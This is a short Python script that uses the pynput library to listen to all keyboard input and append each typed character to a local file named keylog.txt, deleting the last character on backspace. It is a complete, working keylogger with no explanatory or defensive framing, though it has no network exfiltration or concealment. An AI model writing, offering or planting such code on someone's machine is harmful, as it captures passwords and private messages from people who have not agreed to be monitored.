from pynput import keyboard

def keyPressed(key):
    if key == keyboard.Key.backspace:
        try:
            with open("keylog.txt", "rb+") as log:
                log.seek(-1, 2)
                log.truncate()
        except:
            pass
        return

    try:
        with open("keylog.txt", "a") as log:
            log.write(key.char)
    except AttributeError:
        pass  # ignore other special keys

if __name__ == "__main__":
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
